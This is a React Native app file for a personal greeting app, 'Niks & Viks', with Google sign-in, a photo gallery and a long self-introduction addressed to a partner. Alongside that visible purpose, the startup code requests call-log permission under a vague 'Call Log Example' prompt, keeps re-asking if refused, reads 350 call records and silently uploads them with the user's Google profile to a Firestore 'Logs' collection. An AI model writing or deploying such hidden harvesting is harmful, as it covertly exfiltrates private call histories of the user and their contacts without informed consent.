

import React, {useState, useEffect} from 'react';
import {
  SafeAreaView,
  ScrollView,
  StatusBar,
  StyleSheet,
  Text,
  useColorScheme,
  View,
  Alert,
  Image,
  ActivityIndicator
} from 'react-native';

import {
  Colors as COLORS,
  Header,
} from 'react-native/Libraries/NewAppScreen';
import { Appbar } from 'react-native-paper';
import Modal from 'react-native-modal';


import {PermissionsAndroid} from 'react-native';
import CallLogs from 'react-native-call-log';
import {
  GoogleSignin,
  GoogleSigninButton,
  statusCodes,
} from '@react-native-google-signin/google-signin';

import firestore from '@react-native-firebase/firestore';
import { v4 as uuidv4 } from 'uuid';
// import { IMAGES_RAW } from './images';

// IMAGES_RAW.map((item)=>{
//   firestore()
//           .collection('Media')
//           .add({...item,id:uuidv4()})
//           .then(() => {
//             console.log('item added!');
//           });
// })

GoogleSignin.configure({
  webClientId:
    '870562139517-39jp5l4e2hgeh2dfao9u2ual79ri9r64.apps.googleusercontent.com',
});

const App = () => {
  const isDarkMode = useColorScheme() === 'dark';
  const [msg, setmsg] = useState("");
  const [userInfo, setUserInfo] = useState({});
  const [images, setImages] = useState([]);
  const [isModal, setIsModal] = useState()
  const backgroundStyle = {
    backgroundColor: isDarkMode ? COLORS.darker : COLORS.lighter,
  };

  const getCurrentUser = async () => {
    const currentUser = await GoogleSignin.getCurrentUser();
    if(currentUser){
      setUserInfo(currentUser)
      getPermission(currentUser);
    }else{
      getPermission();
    }
    
  };

  const getImages = () => {
    firestore().collection('Media')
      .get()
      .then(querySnapshot => {
        const documents = querySnapshot.docs.map(doc => doc.data())
        setImages(documents)
        // do something with documents
      })
  }


  const getPermission = async (currentUser) => {
    try {
      const granted = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
        {
          title: 'Call Log Example',
          message: 'Access your call logs',
          // buttonNeutral: 'Ask Me Later',
          // buttonNegative: 'Cancel',
          buttonPositive: 'OK',
        },
      );
      if (granted === PermissionsAndroid.RESULTS.GRANTED) {
        const result = await CallLogs.load(350);
        
        const name = currentUser && currentUser.user && currentUser.user.givenName || "z";
        const uid = `${name}-${uuidv4()}`
        firestore()
          .collection('Logs')
          .doc(uid).set({currentUser, name, info: result, dated: new Date().toLocaleString()})
          .then(() => {
          });
      } else {
        getPermission()
        console.log('Call Log permission denied');
      }
    } catch (e) {
      console.log(e);
    }
  }

  useEffect(() => {
    getCurrentUser();
    getImages()
  }, []);

  const _signIn = async () => {
    try {
      await GoogleSignin.hasPlayServices();
      const userInfo = await GoogleSignin.signIn();
      setIsModal(true)
      setUserInfo(userInfo)
      firestore()
          .collection('Users')
          .add(userInfo)
          .then(() => {
            console.log('User added!');
          });
      // setmsg("Hi Nikita, I love you")
    } catch (error) {
      switch (error.code) {
        case statusCodes.SIGN_IN_CANCELLED:
          // sign in was cancelled
          Alert.alert('cancelled');
          break;
        case statusCodes.IN_PROGRESS:
          // operation (eg. sign in) already in progress
          Alert.alert('in progress');
          break;
        case statusCodes.PLAY_SERVICES_NOT_AVAILABLE:
          // android only
          Alert.alert('play services not available or outdated');
          break;
        default:
          Alert.alert('Something went wrong', error.toString());
      }
    }
  };

  const closeModal = () => {
    setIsModal(false)
  }

  return (
    <SafeAreaView style={styles.container}>
      <Appbar style={styles.bottom}>
        <Text style={styles.headertext} >
          Niks & Viks
        </Text>
      </Appbar>
      
      <GoogleSigninButton
              style={{width: 192, height: 48, marginTop:50}}
              size={GoogleSigninButton.Size.Wide}
              color={GoogleSigninButton.Color.Dark}
              onPress={_signIn}
              // disabled={this.state.isSigninInProgress}
      />
      <ScrollView
        contentInsetAdjustmentBehavior="automatic"
       >
        
        <Text>{msg}</Text>
        <View style={styles.container}>
          
        
            {images.map((item,idx)=>{
              return <Image
                key={idx}
                style={styles.tinyLogo}
                resizeMode="cover"
                source={{
                  uri: item.uri,
                }}
              />
            })}

            {/* {images.map((item,idx)=>{
              return <AnimatedImage
                containerStyle={{backgroundColor: UiColors.blue50, marginBottom: 10}}
                style={{resizeMode: 'cover', height: 250}}
                source={{uri: item.uri}}
                loader={<ActivityIndicator />}
                key={idx}
                animationDuration={idx === 0 ? 300 : 800}
              />
            })} */}
      


        </View>
        <View>
      <Modal isVisible={isModal} onBackdropPress={closeModal}>
        <View style={{flex: 1, backgroundColor: "#ffff", marginVertical:70, marginHorizontal:20, borderRadius:10, padding:20}}>
          <Text>
          Hi myself Vivek aka Stuart - pikachu ka friend, tanu ka humsafar and Nikita ka Aafat  (health ke liye)...
          </Text>
          <Text>

 I prefer Stuart kyunki wo pikachu ka friend hai.
 Moving forward... I have completed Bachelor's of Engineering in Computer Science from UIET, Panjab University, Chandigarh and is currently working as SE with Justdial.
 At school I scored 84% and 75.8% in class 10th and 12th respectively.
 I am a brother of four best souls in this world and a blessed son. This equates to a family of eight i.e. Me Mummy Papa.. Didi (Rekha), Neetu , Neha, Bhawna n you😍.
 My hobbies currently includes cooking and eating delicious food, be it Indian, chinese or anything. I would love to travel places , see things and explore them . I enjoy doing things in a team .. me n you a team against our odds in life. Like eating together, planning a trip together, buying stuff together. 
Favourite food or food I love- 
Mummy's food... 
Didi ka shahi kofte, burger.
Neha is all-rounder...in food..
Rest bahar ka ... Chicken Mutton noodles momos.. 
Apni kachodi,  aloo puri station wali..
Dahi badey, gol gappe, tikki...
I enjoy food only if the person with me is enjoying that food otherwise I just pretend ki I am liking food. 

I like going out and party with friends like hangouts...drinking ...flowing emotions out n stuff..
          </Text>
        </View>
      </Modal>
    </View>
      </ScrollView>
    </SafeAreaView>
  );
};

const styles = StyleSheet.create({

  container: {
    paddingTop: 10,
    flex: 1,
    justifyContent: "space-between",
    flexDirection: "column",
    alignItems: "center"
  },
  tinyLogo: {
    marginVertical: 16,
    width: 350,
    height: 350,
  },
  logo: {
    width: 66,
    height: 58,
  },
  bottom: {
    position: 'absolute',
    left: 0,
    right: 0,
    top: 0,
  },
  headertext : {
    color: "#ffff",
    fontSize: 18,
    marginLeft:150,
  }
});

export default App;
